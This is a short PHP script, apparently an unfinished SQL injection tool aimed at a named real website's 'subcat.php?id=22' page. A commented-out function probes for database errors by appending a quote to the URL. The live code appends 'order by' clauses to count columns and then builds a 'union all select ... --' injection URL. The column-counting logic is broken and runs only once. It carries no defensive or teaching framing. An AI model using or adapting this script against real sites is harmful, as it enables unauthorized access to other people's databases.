<?php
/*
function getError($url)
{
	$headers = get_headers($url,1);

	if ($headers[0] == 'HTTP/1.1 200 OK')
	{
		$errorUrl = $url . "'";

		$contents = file_get_contents($errorUrl);

		return $contents;
	}

	return NULL;
}
var_dump(getError("http://www.bible-history.com/subcat.php?id=22"));
*/

$url = "http://www.bible-history.com/subcat.php?id=22";
$column = 1;

if ($column == 1)
{
	$orderUrl = $url . " order by " . $column;
	$column++;
	$contents = file_get_contents($orderUrl);
}

$column--;
$getRange = implode (",", range (1,$column));
$shortUrl = substr_replace($url, "" ,-2);
$getColumn = $shortUrl . chr(8)."null union all select " . $getRange . "--";
var_dump($getColumn);
?>